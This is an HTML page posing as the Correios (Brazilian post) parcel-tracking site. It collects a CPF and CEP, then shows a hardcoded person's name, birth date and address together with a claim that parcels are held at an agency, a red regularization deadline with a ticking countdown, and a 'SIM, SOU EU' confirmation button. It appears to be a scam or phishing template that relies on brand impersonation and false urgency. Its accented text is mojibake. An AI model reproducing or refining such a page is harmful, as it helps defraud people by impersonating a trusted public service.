<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <link rel="stylesheet" href="css/bootstrap.css" />
  <link rel="stylesheet" href="css/app.css" />
  <link rel="stylesheet" href="css/yellow.css" />
  <title>Correios | Rastreio</title>
  <style>
    @keyframes pulsar {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    #consultar-btn { animation: pulsar 1s infinite; }
    .spinner {
      width: 50px; height: 50px;
      border: 5px solid rgba(0, 0, 0, 0.1);
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    main { max-width: 1000px; margin: 2rem auto; padding: 0 1rem; }
    #resultado {
      background: #fff;
      padding: 20px 25px;
      margin: 30px auto;
      border-radius: 8px;
      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
      max-width: 420px;
      width: 100%;
      font-size: 14px;
      font-weight: 400;
      color: #003157;
      text-align: center;
    }
    #resultado h2 {
      font-size: 16px;
      font-weight: 700;
      margin-bottom: 16px;
      color: #003157;
    }
    #resultado p { margin: 6px 0; line-height: 1.3; }
    #resultado p span.label {
      font-weight: 700;
      margin-right: 6px;
      color: #003157;
    }
    #res-rua, #res-bairro {
      color: white !important;
      background-color: #003157;
      padding: 2px 6px;
      border-radius: 4px;
      display: inline-block;
      margin-left: 4px;
    }
    #prazo-container {
      margin-top: 18px;
      font-weight: 700;
      font-size: 14px;
      color: red;
    }
    #countdown {
      font-weight: 400;
      margin-top: 6px;
      font-size: 13px;
      color: red;
    }
    #btn-sim-sou-eu {
      margin-top: 20px;
      background-color: #007bff;
      border: none;
      color: white;
      padding: 10px 25px;
      font-size: 14px;
      font-weight: 700;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      max-width: 240px;
      margin-left: auto;
      margin-right: auto;
      display: block;
      transition: background-color 0.3s ease;
    }
    #btn-sim-sou-eu:hover { background-color: #0056b3; }
  </style>
</head>

<body>
  <main>
    <section id="tela-formulario">
      <h1>Rastreamento</h1>
      <form id="form-rastreamento">
        <div>
          <label>CPF:</label>
          <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required />
        </div>
        <div>
          <label>CEP:</label>
          <input type="text" id="cep" placeholder="00000-000" maxlength="9" required />
        </div>
        <div id="botao-container">
          <button type="submit" id="consultar-btn">Consultar</button>
        </div>
        <div id="loading-container" style="display:none;">
          <p>Consultando seus dados...</p>
          <div class="spinner"></div>
        </div>
      </form>
    </section>

    <section id="resultado" style="display:none;">
      <h2>Encontramos pedidos retidos em uma de nossas agÃªncias. ðŸ“¦</h2>
      <p><span class="label">Nome:</span> <span id="res-nome"></span></p>
      <p><span class="label">CPF:</span> <span id="res-cpf"></span></p>
      <p><span class="label">Nascimento:</span> <span id="res-nascimento"></span></p>
      <p><span class="label">CEP:</span> <span id="res-cep"></span></p>
      <p><span class="label">Rua:</span> <span id="res-rua"></span></p>
      <p><span class="label">Bairro:</span> <span id="res-bairro"></span></p>
      <p><span class="label">Cidade:</span> <span id="res-cidade"></span></p>
      <p><span class="label">Estado:</span> <span id="res-estado"></span></p>

      <div id="prazo-container">
        Prazo para RegularizaÃ§Ã£o: <span id="res-prazo"></span>
        <div id="countdown"></div>
      </div>

      <button id="btn-sim-sou-eu">SIM, SOU EU</button>
    </section>
  </main>

  <script>
    function formatarCPF(cpf) {
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    function formatarCEP(cep) {
      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
    }

    function calcularPrazo(dias) {
      const data = new Date();
      data.setDate(data.getDate() + dias);
      const dd = String(data.getDate()).padStart(2, '0');
      const mm = String(data.getMonth() + 1).padStart(2, '0');
      const yyyy = data.getFullYear();
      return `${dd}/${mm}/${yyyy} Ã s 23:59`;
    }

    let prazoFinal;

    function iniciarCountdown() {
      const countEl = document.getElementById("countdown");
      const prazo = prazoFinal.getTime();

      const interval = setInterval(() => {
        const agora = new Date().getTime();
        const dist = prazo - agora;
        if (dist <= 0) {
          countEl.textContent = "Prazo expirado!";
          clearInterval(interval);
        } else {
          const dias = Math.floor(dist / (1000 * 60 * 60 * 24));
          const horas = Math.floor((dist % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
          const minutos = Math.floor((dist % (1000 * 60 * 60)) / (1000 * 60));
          const segundos = Math.floor((dist % (1000 * 60)) / 1000);
          countEl.textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
        }
      }, 1000);
    }

    document.getElementById("form-rastreamento").addEventListener("submit", async function (e) {
      e.preventDefault();
      const cpf = document.getElementById("cpf").value.replace(/\D/g, "");
      const cep = document.getElementById("cep").value.replace(/\D/g, "");

      if (cpf.length !== 11 || cep.length !== 8) {
        alert("CPF ou CEP invÃ¡lido.");
        return;
      }

      document.getElementById("botao-container").style.display = "none";
      document.getElementById("loading-container").style.display = "block";

      await new Promise(r => setTimeout(r, 2000));

      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
      document.getElementById("res-cpf").textContent = formatarCPF(cpf);
      document.getElementById("res-nascimento").textContent = "27/01/1985";
      document.getElementById("res-cep").textContent = formatarCEP(cep);
      document.getElementById("res-rua").textContent = "Rua das AcÃ¡cias";
      document.getElementById("res-bairro").textContent = "Centro";
      document.getElementById("res-cidade").textContent = "PorciÃºncula";
      document.getElementById("res-estado").textContent = "RJ";

      const prazoTexto = calcularPrazo(10);
      document.getElementById("res-prazo").textContent = prazoTexto;

      prazoFinal = new Date();
      prazoFinal.setDate(prazoFinal.getDate() + 10);
      prazoFinal.setHours(23);
      prazoFinal.setMinutes(59);
      prazoFinal.setSeconds(0);

      iniciarCountdown();

      document.getElementById("tela-formulario").style.display = "none";
      document.getElementById("loading-container").style.display = "none";
      document.getElementById("resultado").style.display = "block";
    });
  </script>
</body>

</html>
